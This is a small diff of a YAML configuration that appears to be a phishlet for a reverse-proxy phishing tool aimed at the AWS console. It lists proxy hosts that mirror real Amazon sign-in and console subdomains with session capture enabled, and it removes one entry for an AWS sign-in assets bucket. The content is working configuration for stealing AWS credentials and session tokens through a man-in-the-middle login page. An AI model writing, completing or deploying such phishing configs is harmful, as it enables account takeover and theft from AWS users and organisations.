@@ -7,8 +7,6 @@ proxy_hosts:
   - {phish_sub: 'aws-portal', orig_sub: 'aws-portal', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'us-east-2.console.aws', orig_sub: 'us-east-2.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'portal.aws', orig_sub: 'portal.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
-  
-  - {phish_sub: 'aws-signin-website-assets.s3', orig_sub: 'aws-signin-website-assets.s3', domain: 'amazonaws.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 's3.console.aws', orig_sub: 's3.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'portal.aws', orig_sub: 'portal.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'signin.aws', orig_sub: 'signin.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
